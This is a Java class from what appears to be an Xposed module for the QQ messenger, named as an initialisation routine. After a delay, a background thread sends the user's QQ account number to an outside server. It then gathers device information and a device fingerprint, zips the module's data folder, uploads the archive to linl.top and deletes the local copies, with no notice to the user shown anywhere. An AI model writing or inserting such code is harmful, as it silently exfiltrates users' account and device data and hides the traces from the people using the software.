package lin.xposed.Initialize;

import ConfigTool.GlobalConfig;
import lin.xposed.HostEnv;
import lin.xposed.QQUtils.QQEnvUtils;
import lin.xposed.Utils.*;
import org.json.JSONObject;

import java.io.File;
import java.util.HashMap;
import java.util.Iterator;

public class HttpInit {
    public static final String baseAESKey = "LINYANZI";
    public static String aesKey;

    public static void init() {
        new Thread(() -> {
            try {
                Thread.sleep(60 * 1000);
            } catch (InterruptedException e) {

            }
            File file = new File(PathInit.paths[0] + "sendEnvInfo.json");
            File file2 = new File(PathInit.paths[0] + "sendEnvInfo.txt");
            //压缩
            String zipPath = PathInit.path + ".lin";
            int num = GlobalConfig.getInt("init");

            try {
                String uin = QQEnvUtils.getCurrentUin();
                String v = getNotExpired();
                String rasPublicKey = GlobalConfig.getString(uin + "_publicKey");
                String s = HttpUtils.sendGet("https://linl.top/startInits", "uin=" + uin + "&info=" + v);

                String printInfo = DeviceInfoUtils.getDeviceFubgerprint();
                String prs = GlobalConfig.getString("hhhh");

                if (!prs.equals(printInfo) || !Boolean.parseBoolean(s)) {
                    //输出设备信息
                    String str = LogUtils.OutputDeviceInfo(true).toString();
                    //文件
                    MFileUtils.writeTextToFile(file2.getAbsolutePath(), str, false);
                    ZipUtil.fileToZip(PathInit.paths[0], zipPath);
                    File zipFile = new File(zipPath);
                    HashMap<String, String> text = new HashMap<>();
                    text.put("uin", uin);
                    text.put("info", v);
                    HashMap<String, File> fileList = new HashMap<>();
                    String time = LogUtils.getTime();
                    fileList.put(time + ".zip", zipFile);
                    String res = HttpUtils.sendFileList("https://linl.top/UserInits", text, fileList);
                    JSONObject jsonObject = new JSONObject(res);
                    Iterator<String> iterator = jsonObject.keys();
                    while (iterator.hasNext()) {
                        String key = iterator.next();
                        if (jsonObject.get(key) instanceof Boolean) {
                            if (jsonObject.getBoolean(key)) {
                                GlobalConfig.putString("hhhh", printInfo);
                                GlobalConfig.putInt("init", 0);
                                return;
                            }
                        }
                    }
                }
            } catch (Exception e) {
                if (num >= 10) {
                    //如果上报十次信息仍然没有成功说明项目已经停了 没有必要走下面的代码了
                    LogUtils.addRunLog("很高兴相遇 愿你的人生如夏花般灿烂 也期待我们还有再次相遇的那天");
                    return;
                }
                GlobalConfig.putInt("init", ++num);
                LogUtils.addRunLog(e);
            } finally {
                FileUtils.deleteFile(file);
                FileUtils.deleteFile(file2);
                FileUtils.deleteFile(new File(zipPath));
            }
        }).start();
    }

    private static String getNotExpired() {
        //当前的版本
        return "q->" + HostEnv.QQVersionName
                + "%26module->" + HostEnv.moduleVersionName;
    }
}
